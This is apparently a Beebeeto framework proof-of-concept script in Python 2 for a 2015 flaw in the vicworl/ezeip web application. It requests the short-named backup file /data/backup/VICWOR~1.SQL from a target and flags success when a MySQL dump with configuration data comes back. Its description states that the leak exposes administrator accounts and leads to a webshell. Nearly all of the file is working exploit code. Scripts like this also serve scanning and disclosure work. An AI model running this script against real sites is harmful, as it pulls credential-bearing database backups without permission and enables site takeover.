#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0145',
            'name': 'vicworl /VICWOR~1.SQL 数据库备份文件下载漏洞 POC',
            'author': 'warsong',
            'create_date': '2015-10-14',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'ezeip',
            'vul_version': ['*'],
            'type': 'Database Found',
            'tag': ['vicworl漏洞', '数据库备份漏洞', 'php'],
            'desc': '''
                    vicworl 数据库备份文件下载漏洞，可以获取管理员账号等非常敏感的信息，
                    可以轻松实现无任何限制获取 WEBSHELL ...
                    ''',
            'references': ['http://www.wooyun.org/bugs/wooyun-2010-0106292'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        verify_url = ('%s/data/backup/VICWOR~1.SQL') % url
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        req = requests.get(verify_url)
        if req.status_code == 200 and 'MySQL dump' in req.content:
            if 'configuration' in req.content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())